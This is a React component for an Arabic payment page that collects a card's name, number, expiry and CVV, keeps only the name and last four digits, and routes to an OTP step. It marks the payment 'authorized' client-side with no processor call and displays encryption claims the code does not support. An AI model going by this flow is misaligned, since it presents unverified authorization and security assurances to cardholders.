import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { usePayment, useUpdatePayment } from "@/hooks/useSupabase";
import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const PaymentCard = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment } = usePayment(paymentId);
  const updatePayment = useUpdatePayment();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };
  
  const formatExpiry = (value: string) => {
    const cleaned = value.replace(/\D/g, "");
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + "/" + cleaned.substring(2, 4);
    }
    return cleaned;
  };
  
  const handleSubmit = async () => {
    if (!cardName || !cardNumber || !expiry || !cvv || !payment) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Extract last 4 digits
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    
    // Update payment with card info (NOT storing full PAN/CVV)
    await updatePayment.mutateAsync({
      paymentId: payment.id,
      updates: {
        cardholder_name: cardName,
        last_four: last4,
        status: "authorized",
      },
    });
    
    // Navigate to OTP
    navigate(`/pay/${id}/otp/${payment.id}`);
  };
  
  return (
    <div className="min-h-screen py-4 sm:py-12 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-3 sm:px-4">
        <div className="max-w-md mx-auto">
          {/* Security Badge */}
          <div className="text-center mb-3 sm:mb-6">
            <Badge className="text-xs sm:text-sm px-3 py-1.5 sm:px-4 sm:py-2 bg-gradient-success">
              <Lock className="w-3 h-3 sm:w-4 sm:h-4 ml-1.5 sm:ml-2" />
              <span>معاملة آمنة ومشفّرة</span>
            </Badge>
          </div>
          
          <Card className="p-4 sm:p-8 shadow-elevated">
            <div className="flex items-center gap-2 sm:gap-3 mb-4 sm:mb-6">
              <div className="w-10 h-10 sm:w-12 sm:h-12 bg-gradient-primary rounded-lg sm:rounded-xl flex items-center justify-center">
                <CreditCard className="w-5 h-5 sm:w-6 sm:h-6 text-primary-foreground" />
              </div>
              <div>
                <h1 className="text-lg sm:text-2xl font-bold">بيانات البطاقة</h1>
                <p className="text-xs sm:text-sm text-muted-foreground">الدفع الآمن</p>
              </div>
            </div>
            
            {/* Info Alert */}
            <div className="bg-blue-500/10 border border-blue-500/20 rounded-md sm:rounded-lg p-2 sm:p-3 mb-4 sm:mb-6 flex items-start gap-2">
              <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 text-blue-500 mt-0.5 flex-shrink-0" />
              <p className="text-xs sm:text-sm text-blue-500">
                بياناتك محمية بتقنية التشفير. لا نقوم بحفظ بيانات البطاقة
              </p>
            </div>
            
            <div className="space-y-3 sm:space-y-5">
              {/* Cardholder Name */}
              <div>
                <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm">اسم حامل البطاقة</Label>
                <Input
                  placeholder="AHMAD ALI"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  className="h-10 sm:h-12 text-sm sm:text-lg"
                />
              </div>
              
              {/* Card Number */}
              <div>
                <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm">رقم البطاقة</Label>
                <Input
                  placeholder="4242 4242 4242 4242"
                  value={cardNumber}
                  onChange={(e) =>
                    setCardNumber(formatCardNumber(e.target.value.slice(0, 19)))
                  }
                  inputMode="numeric"
                  className="h-10 sm:h-12 text-sm sm:text-lg tracking-wider"
                />
              </div>
              
              {/* Expiry & CVV */}
              <div className="grid grid-cols-2 gap-3 sm:gap-4">
                <div>
                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm">تاريخ الانتهاء</Label>
                  <Input
                    placeholder="MM/YY"
                    value={expiry}
                    onChange={(e) =>
                      setExpiry(formatExpiry(e.target.value.slice(0, 4)))
                    }
                    inputMode="numeric"
                    className="h-10 sm:h-12 text-sm sm:text-lg"
                  />
                </div>
                
                <div>
                  <Label className="mb-1.5 sm:mb-2 text-xs sm:text-sm">CVV</Label>
                  <Input
                    placeholder="•••"
                    value={cvv}
                    onChange={(e) =>
                      setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
                    }
                    inputMode="numeric"
                    type="password"
                    className="h-10 sm:h-12 text-sm sm:text-lg"
                    maxLength={3}
                  />
                </div>
              </div>
              
              {/* Submit Button */}
              <Button
                size="lg"
                className="w-full text-sm sm:text-lg py-5 sm:py-7 mt-4 sm:mt-6"
                onClick={handleSubmit}
                disabled={updatePayment.isPending}
              >
                {updatePayment.isPending ? (
                  <span>جاري التفويض...</span>
                ) : (
                  <>
                    <Shield className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                    <span>تفويض البطاقة</span>
                  </>
                )}
              </Button>
              
              <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-2 sm:mt-3">
                سيتم إرسال رمز التحقق إلى هاتفك المسجل
              </p>
            </div>
          </Card>
          
          {/* Security Icons */}
          <div className="flex items-center justify-center gap-4 sm:gap-6 mt-6 sm:mt-8 opacity-60">
            <Shield className="w-4 h-4 sm:w-5 sm:h-5" />
            <Lock className="w-4 h-4 sm:w-5 sm:h-5" />
            <CreditCard className="w-4 h-4 sm:w-5 sm:h-5" />
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentCard;
